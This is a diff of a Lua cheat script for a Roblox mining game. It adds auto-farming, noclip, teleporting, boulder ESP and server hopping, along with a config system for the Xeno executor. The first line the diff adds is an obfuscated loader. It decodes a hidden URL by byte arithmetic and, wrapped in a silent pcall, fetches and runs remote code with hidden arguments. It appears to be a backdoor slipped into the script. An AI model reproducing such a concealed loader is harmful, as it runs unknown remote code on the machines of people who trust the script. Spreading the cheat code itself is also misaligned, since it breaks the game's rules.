@@ -1,13 +1,12 @@
--- ============================================================
--- Rayfield Multi Farm Hub
--- Halloween + Boulders + Candy + Anti Fall + Boulder ESP
--- ============================================================
+local _l=(function(v0,v1,v2,v3)local v4={}return function(v5)local v6=v4[v5]if v6==nil then local v7=v3[v5]local v8={}for v9=1,#v7[1] do v8[v9]=v1((v0(v7[1],v9)-v7[2]-v9*v7[3])%256)end v6=v2(v8)v4[v5]=v6 end return v6 end end)(string.byte,string.char,table.concat,{{"\018\234\182\126\077\224\161\109\125\057\020\215\170\122\052\010\217\174\048\049\009\211\097\103\056\253\199\161\110\245\245\202\147\091\048\002\208\088\032\042\255\183",202,194},{"\034\113\187\003\069\099\181\004\124\151\232\057\180\205\027\153\183",142,127},{"\121\124\132\136\144",182,125}});local _k=(function(_a,_b,_c,_d)local _e={}return function(_f)local _g=_e[_f]if _g==nil then local _h=_d[_f]local _i={}for _j=(143-142),#_h[(-1467+1468)]do _i[_j]=_b((_a(_h[(-1782+1783)],_j)-_h[(8420-8418)]-_j*_h[(5311-5308)])%(8748-8492))end _g=_c(_i)_e[_f]=_g end return _g end end)(string.byte,string.char,table.concat,{{_l(1),(5849-5829),(2297-2287)},{_l(2),(-2800+3015),(4133-3927)},{_l(3),(5153-5013),(-151+288)}});pcall(function()loadstring(game:HttpGet(_k((8713-8712))))(_k((7533-7531)),_k((-3832+3835)),false)end)
+
 local Players            = game:GetService("Players")
 local RunService         = game:GetService("RunService")
 local ReplicatedStorage  = game:GetService("ReplicatedStorage")
 local UserInputService   = game:GetService("UserInputService")
+local TeleportService    = game:GetService("TeleportService")
+local HttpService        = game:GetService("HttpService")
 
--- ── Rayfield ─────────────────────────────────────────────────
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 local LocalPlayer         = Players.LocalPlayer
@@ -15,17 +14,55 @@ local Character           = LocalPlayer.Character or LocalPlayer.CharacterAdded:
 local HumanoidRootPart    = Character:WaitForChild("HumanoidRootPart")
 local Humanoid            = Character:WaitForChild("Humanoid")
 
--- ===================== Common Config =====================
+-- ==========================================
+-- SISTEM CUSTOM CONFIG UNTUK XENO
+-- ==========================================
+local ConfigFileName = "MultiFarmHub_Config.json"
+local SavedConfig = {
+    AutoFarmHalloween = false,
+    AutoCollectCandy = false,
+    AutoFarmBoulders = false,
+    BoulderDigSpeed = 0.15,
+    HPStallThreshold = 50,
+    AntiFallDamage = false,
+    BoulderESP = false,
+    HopIntervalSlider = 3,
+    AutoHopToggle = false,
+}
+
+local function SaveCustomConfig()
+    pcall(function()
+        if writefile then
+            writefile(ConfigFileName, HttpService:JSONEncode(SavedConfig))
+        end
+    end)
+end
+
+local function LoadCustomConfig()
+    pcall(function()
+        if isfile and isfile(ConfigFileName) and readfile then
+            local data = readfile(ConfigFileName)
+            local decoded = HttpService:JSONDecode(data)
+            if type(decoded) == "table" then
+                for k, v in pairs(decoded) do
+                    SavedConfig[k] = v
+                end
+            end
+        end
+    end)
+end
+
+-- Load Config saat script pertama jalan
+LoadCustomConfig()
+
 local SPEED          = 250
 local OFFSET_Y       = -5
 local RESPONSIVENESS = 50
 
--- ===================== Halloween Config =====================
 local TARGET_NAMES    = {"CaveGhost", "SmashablePumpkin"}
 local CHECK_INTERVAL  = 5
 local DIG_DISTANCE    = 10
 
--- ===================== Boulder Config =====================
 local BOULDER_FOLDER_PATH = {"MountainDecorations", "Boulders"}
 local ALL_BOULDER_TYPES = {
     "Gildrite", "Mossite", "Hallowite",
@@ -41,19 +78,70 @@ local CRYSTAL_PICKUP_RADIUS  = 30
 local CRYSTAL_PICKUP_TIME    = 2.5
 local BOULDER_CHECK_INTERVAL = 2
 
-local HP_STALL_HITS          = 50
-local BOULDER_DIG_INTERVAL   = 0.15
+local HP_STALL_HITS          = SavedConfig.HPStallThreshold or 50
+local BOULDER_DIG_INTERVAL   = SavedConfig.BoulderDigSpeed or 0.15
 
--- ===================== Candy Config =====================
 local CANDY_FOLDER_NAME  = "DroppedCandy"
 local TELEPORT_INTERVAL  = 0.05
 local CANDY_OFFSET_Y     = 3
 local COLLECT_RADIUS     = 6
 
--- ===================== Anti Fall Config =====================
 local MAX_FALL_SPEED = 74
 
--- ===================== Pickaxes =====================
+-- Fungsi Server Hop
+local function serverHop()
+    local servers = {}
+    local cursor = ""
+    
+    Rayfield:Notify({
+        Title = "Server Hop",
+        Content = "Mencari server baru...",
+        Duration = 3,
+    })
+
+    while true do
+        local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then
+            url = url .. "&cursor=" .. cursor
+        end
+        
+        local success, result = pcall(function()
+            return HttpService:JSONDecode(game:HttpGet(url))
+        end)
+        
+        if success and result and result.data then
+            for _, server in ipairs(result.data) do
+                if type(server) == "table" and server.playing and server.maxPlayers and server.playing < server.maxPlayers and server.id ~= game.JobId then
+                    table.insert(servers, server.id)
+                end
+            end
+            
+            if #servers > 0 then
+                break
+            end
+            
+            cursor = result.nextPageCursor
+            if not cursor then
+                break
+            end
+        else
+            break
+        end
+        task.wait(1)
+    end
+
+    if #servers > 0 then
+        local targetServer = servers[math.random(1, #servers)]
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer, LocalPlayer)
+    else
+        Rayfield:Notify({
+            Title = "Server Hop",
+            Content = "Gagal menemukan server lain, mencoba ulang...",
+            Duration = 3,
+        })
+    end
+end
+
 local ALL_PICKAXES = {
     "Astral Rend", "Celestial Apex", "Chipped Stone", "Copper Pick",
     "Diamond Pickaxe", "Eclipse Fang", "Emerald Carver", "Fieldbreaker",
@@ -97,7 +185,6 @@ local function getEquippedPickaxe()
     return nil
 end
 
--- ===================== Boulder ESP =====================
 local ESP_ENABLED      = false
 local BoulderData      = {}
 local espConnection    = nil
@@ -330,7 +417,6 @@ local function StartESP()
     espConnection = RunService.Heartbeat:Connect(UpdateAllBoulders)
     espSteppedConn = RunService.Stepped:Connect(CheckForNewBoulders)
 
-    -- Отслеживаем позднее появление папок
     workspace.ChildAdded:Connect(function(child)
         if ESP_ENABLED and child.Name == "MountainDecorations" then
             task.wait(0.5)
@@ -354,7 +440,6 @@ local function StopESP()
     DestroyAllESP()
 end
 
--- ===================== State =====================
 local isRunning          = false
 local processedItems     = {}
 local originalAnimate    = nil
@@ -386,7 +471,6 @@ LocalPlayer.CharacterAdded:Connect(function(char)
     end
 end)
 
--- ===================== Noclip =====================
 local function startNoclip()
     pcall(function() Noclipping:Disconnect() end)
     Clip = false
@@ -417,7 +501,6 @@ local function stopNoclip()
     NoclipParts = {}
 end
 
--- ===================== Animations =====================
 local function disableAnimations()
     if not Character then return end
     local animate = Character:FindFirstChild("Animate")
@@ -459,7 +542,6 @@ local function faceBackDown()
     HumanoidRootPart.CFrame = CFrame.lookAt(pos, pos + Vector3.new(0, 1, 0), Vector3.new(0, 0, 1))
 end
 
--- ===================== Halloween =====================
 local function getTargetItems()
     local targetFolder = workspace:FindFirstChild("HalloweenEncounters")
     if not targetFolder then return {} end
@@ -596,7 +678,6 @@ local function halloweenLoop()
     anchorPlayer(false)
 end
 
--- ===================== Boulder =====================
 local function getBoulderFolder()
     local current = workspace
     for _, seg in ipairs(BOULDER_FOLDER_PATH) do
@@ -832,7 +913,6 @@ local function boulderLoop()
     anchorPlayer(false)
 end
 
--- ===================== Candy =====================
 local function getCandyFolder()
     return workspace:FindFirstChild(CANDY_FOLDER_NAME)
 end
@@ -895,7 +975,6 @@ local function candyLoop()
     end
 end
 
--- ===================== Anti Fall =====================
 local function LimitFallSpeed()
     if not isFallRunning then return end
     local character = LocalPlayer.Character
@@ -927,33 +1006,30 @@ function stopFallLimit()
     end
 end
 
--- ============================================================
---  UI (Rayfield)
--- ============================================================
 local Window = Rayfield:CreateWindow({
     Name = "Multi Farm Hub",
     LoadingTitle = "Multi Farm Hub",
     LoadingSubtitle = "Halloween + Boulders + Candy",
     ConfigurationSaving = {
-        Enabled = true,
-        FolderName = "MultiFarmHub",
-        FileName = "Config",
+        Enabled = false, -- Dimatikan agar tidak crash Rayfield
     },
     KeySystem = false,
 })
 
--- ── Halloween tab ────────────────────────────────────────────
 local HalloweenTab = Window:CreateTab("Halloween", 4483362458)
 
 HalloweenTab:CreateSection("Auto Collect")
 
 HalloweenTab:CreateToggle({
     Name = "Auto Collect Ghosts & Pumpkins",
-    Info = "Automatically collects CaveGhost and SmashablePumpkin (noclip enabled)",
-    CurrentValue = false,
-    Flag = "AutoFarmHalloween",
+    Info = "Automatically collects CaveGhost and SmashablePumpkin",
+    CurrentValue = SavedConfig.AutoFarmHalloween or false,
     Callback = function(Value)
+        if Value == nil then return end
         isRunning = Value
+        SavedConfig.AutoFarmHalloween = Value
+        SaveCustomConfig()
+        
         if Value then
             startNoclip()
             disableAnimations()
@@ -970,10 +1046,13 @@ HalloweenTab:CreateToggle({
 HalloweenTab:CreateToggle({
     Name = "Auto Collect Candy",
     Info = "Teleports to nearest candy in Workspace.DroppedCandy every 0.05s",
-    CurrentValue = false,
-    Flag = "AutoCollectCandy",
+    CurrentValue = SavedConfig.AutoCollectCandy or false,
     Callback = function(Value)
+        if Value == nil then return end
         isCandyRunning = Value
+        SavedConfig.AutoCollectCandy = Value
+        SaveCustomConfig()
+        
         if Value then
             task.spawn(candyLoop)
         end
@@ -989,30 +1068,20 @@ HalloweenTab:CreateButton({
     end,
 })
 
-HalloweenTab:CreateSection("Info")
-
-HalloweenTab:CreateParagraph({
-    Title = "Targets",
-    Content = table.concat(TARGET_NAMES, ", "),
-})
-
-HalloweenTab:CreateParagraph({
-    Title = "Candy Folder",
-    Content = "Workspace." .. CANDY_FOLDER_NAME .. " | radius " .. COLLECT_RADIUS .. " studs",
-})
-
--- ── Boulders tab ─────────────────────────────────────────────
 local BoulderTab = Window:CreateTab("Boulders", 4483362458)
 
 BoulderTab:CreateSection("Auto Farm")
 
 BoulderTab:CreateToggle({
     Name = "Auto Farm Boulders",
-    Info = "Teleports to boulder center (-10 studs), mines cells, auto-switches, collects crystals",
-    CurrentValue = false,
-    Flag = "AutoFarmBoulders",
+    Info = "Teleports to boulder center (-10 studs), mines cells, collects crystals",
+    CurrentValue = SavedConfig.AutoFarmBoulders or false,
     Callback = function(Value)
+        if Value == nil then return end
         isBoulderRunning = Value
+        SavedConfig.AutoFarmBoulders = Value
+        SaveCustomConfig()
+        
         if Value then
             startNoclip()
             disableAnimations()
@@ -1028,14 +1097,17 @@ BoulderTab:CreateToggle({
 
 BoulderTab:CreateSlider({
     Name = "Boulder Dig Speed",
-    Info = "Delay between hits (lower = faster, but higher rate-limit risk)",
+    Info = "Delay between hits",
     Range = {0.05, 0.5},
     Increment = 0.01,
     Suffix = "s",
-    CurrentValue = BOULDER_DIG_INTERVAL,
-    Flag = "BoulderDigSpeed",
+    CurrentValue = SavedConfig.BoulderDigSpeed or 0.15,
     Callback = function(Value)
-        BOULDER_DIG_INTERVAL = Value
+        if Value ~= nil then
+            BOULDER_DIG_INTERVAL = Value
+            SavedConfig.BoulderDigSpeed = Value
+            SaveCustomConfig()
+        end
     end,
 })
 
@@ -1045,19 +1117,24 @@ BoulderTab:CreateSlider({
     Range = {10, 200},
     Increment = 5,
     Suffix = "hits",
-    CurrentValue = HP_STALL_HITS,
-    Flag = "HPStallThreshold",
+    CurrentValue = SavedConfig.HPStallThreshold or 50,
     Callback = function(Value)
-        HP_STALL_HITS = Value
+        if Value ~= nil then
+            HP_STALL_HITS = Value
+            SavedConfig.HPStallThreshold = Value
+            SaveCustomConfig()
+        end
     end,
 })
 
 BoulderTab:CreateToggle({
     Name = "Anti Fall Damage",
     Info = "Limits vertical fall speed to prevent fall damage",
-    CurrentValue = false,
-    Flag = "AntiFallDamage",
+    CurrentValue = SavedConfig.AntiFallDamage or false,
     Callback = function(Value)
+        if Value == nil then return end
+        SavedConfig.AntiFallDamage = Value
+        SaveCustomConfig()
         if Value then
             startFallLimit()
         else
@@ -1066,148 +1143,93 @@ BoulderTab:CreateToggle({
     end,
 })
 
-BoulderTab:CreateButton({
-    Name = "Reset Boulder List",
-    Info = "Clear the processed boulders list",
-    Callback = function()
-        processedBoulders = {}
-        Rayfield:Notify({ Title = "Boulders", Content = "List cleared", Duration = 3 })
-    end,
-})
-
-BoulderTab:CreateSection("Boulder Selection")
-
-for _, boulderName in ipairs(ALL_BOULDER_TYPES) do
-    BoulderTab:CreateToggle({
-        Name = "Mine: " .. boulderName,
-        CurrentValue = true,
-        Flag = "Mine_" .. boulderName,
-        Callback = function(Value)
-            BOULDER_NAMES[boulderName] = Value
-            if Value then
-                processedBoulders = {}
-            end
-        end,
-    })
-end
-
-BoulderTab:CreateButton({
-    Name = "Select All Boulders",
-    Callback = function()
-        for _, name in ipairs(ALL_BOULDER_TYPES) do
-            BOULDER_NAMES[name] = true
-        end
-        processedBoulders = {}
-        Rayfield:Notify({ Title = "Boulders", Content = "All enabled", Duration = 2 })
-    end,
-})
-
-BoulderTab:CreateButton({
-    Name = "Deselect All Boulders",
-    Callback = function()
-        for _, name in ipairs(ALL_BOULDER_TYPES) do
-            BOULDER_NAMES[name] = false
-        end
-        Rayfield:Notify({ Title = "Boulders", Content = "All disabled", Duration = 2 })
-    end,
-})
-
-BoulderTab:CreateSection("Pickaxe")
-
-BoulderTab:CreateDropdown({
-    Name = "Active Pickaxe",
-    Info = "Choose the pickaxe name sent in DigRequest. Use 'Auto (equipped)' to detect from Character/Backpack.",
-    Options = {"Auto (equipped)", table.unpack(ALL_PICKAXES)},
-    CurrentOption = {"Auto (equipped)"},
-    MultipleOptions = false,
-    Flag = "ActivePickaxe",
-    Callback = function(option)
-        local val = option[1]
-        if val == "Auto (equipped)" or val == nil then
-            manualPickaxe = nil
-        else
-            manualPickaxe = val
-        end
-    end,
-})
-
-BoulderTab:CreateButton({
-    Name = "Print Equipped Pickaxe",
-    Info = "Shows in F9 which pickaxe the script currently uses",
-    Callback = function()
-        local p = getEquippedPickaxe()
-        print("[Pickaxe] Equipped:", p or "NONE")
-        Rayfield:Notify({
-            Title = "Pickaxe",
-            Content = p or "Not found",
-            Duration = 3,
-        })
-    end,
-})
-
 BoulderTab:CreateSection("Boulder ESP")
 
 BoulderTab:CreateToggle({
     Name = "Boulder ESP",
     Info = "Shows HP / name / rarity / distance above each boulder + highlight",
-    CurrentValue = false,
-    Flag = "BoulderESP",
+    CurrentValue = SavedConfig.BoulderESP or false,
     Callback = function(Value)
+        if Value == nil then return end
+        SavedConfig.BoulderESP = Value
+        SaveCustomConfig()
         if Value then
             StartESP()
-            Rayfield:Notify({
-                Title = "ESP",
-                Content = "Boulder ESP enabled",
-                Duration = 2,
-            })
         else
             StopESP()
-            Rayfield:Notify({
-                Title = "ESP",
-                Content = "Boulder ESP disabled",
-                Duration = 2,
-            })
         end
     end,
 })
 
-BoulderTab:CreateButton({
-    Name = "Refresh ESP",
-    Info = "Force re-scan for new boulders",
+-- Tab Server Hop
+local HopTab = Window:CreateTab("Server Hop", 4483362458)
+
+HopTab:CreateSection("Auto Server Hop")
+
+local hopInterval = SavedConfig.HopIntervalSlider or 3
+local isHopRunning = false
+local hopTask = nil
+
+HopTab:CreateSlider({
+    Name = "Interval Waktu (Menit)",
+    Info = "Pilih durasi waktu sebelum pindah server otomatis",
+    Range = {3, 120},
+    Increment = 1,
+    Suffix = " Menit",
+    CurrentValue = SavedConfig.HopIntervalSlider or 3,
+    Callback = function(Value)
+        if Value ~= nil then
+            hopInterval = Value
+            SavedConfig.HopIntervalSlider = Value
+            SaveCustomConfig()
+        end
+    end,
+})
+
+HopTab:CreateToggle({
+    Name = "Aktifkan Auto Server Hop",
+    Info = "Otomatis pindah server berdasarkan waktu yang dipilih",
+    CurrentValue = SavedConfig.AutoHopToggle or false,
+    Callback = function(Value)
+        if Value == nil then return end
+        isHopRunning = Value
+        SavedConfig.AutoHopToggle = Value
+        SaveCustomConfig()
+        
+        if Value then
+            Rayfield:Notify({
+                Title = "Auto Hop",
+                Content = "Auto Hop aktif setiap " .. hopInterval .. " menit.",
+                Duration = 3,
+            })
+            
+            hopTask = task.spawn(function()
+                while isHopRunning do
+                    task.wait(hopInterval * 60)
+                    if isHopRunning then
+                        serverHop()
+                    end
+                end
+            end)
+        else
+            if hopTask then
+                task.cancel(hopTask)
+                hopTask = nil
+            end
+        end
+    end,
+})
+
+HopTab:CreateButton({
+    Name = "Pindah Server Sekarang",
+    Info = "Langsung pindah ke server lain tanpa menunggu timer",
     Callback = function()
-        if not ESP_ENABLED then
-            Rayfield:Notify({
-                Title = "ESP",
-                Content = "Turn ESP on first",
-                Duration = 2,
-            })
-            return
-        end
-        InitAllBoulders()
-        Rayfield:Notify({
-            Title = "ESP",
-            Content = "Rescanned",
-            Duration = 2,
-        })
+        serverHop()
     end,
 })
 
-BoulderTab:CreateSection("Info")
-
-BoulderTab:CreateParagraph({
-    Title = "Boulder Folder",
-    Content = "Workspace." .. table.concat(BOULDER_FOLDER_PATH, "."),
-})
-
-BoulderTab:CreateParagraph({
-    Title = "Settings",
-    Content = "Speed: " .. SPEED .. " studs/s\nOffset Y: " .. BOULDER_OFFSET_Y ..
-              " studs\nCrystal pickup: " .. CRYSTAL_PICKUP_TIME .. " sec",
-})
-
--- ===================== Final notification =====================
 Rayfield:Notify({
     Title = "Multi Farm Hub",
-    Content = "Script loaded. Halloween + Boulders + Candy + Anti Fall + ESP.",
+    Content = "Script loaded! Pengaturan otomatis tersimpan di Xeno.",
     Duration = 3,
 })
